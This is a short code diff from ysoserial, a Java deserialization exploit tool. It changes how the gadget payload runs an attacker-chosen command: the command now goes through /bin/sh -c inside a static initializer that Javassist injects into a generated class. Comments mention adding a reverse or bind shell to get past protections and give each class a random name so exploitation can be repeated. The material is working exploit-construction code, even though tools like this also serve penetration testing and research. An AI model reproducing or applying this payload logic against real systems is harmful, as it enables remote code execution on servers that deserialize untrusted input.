@@ -114,9 +114,9 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
-            "\");";
+            "\"});";
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
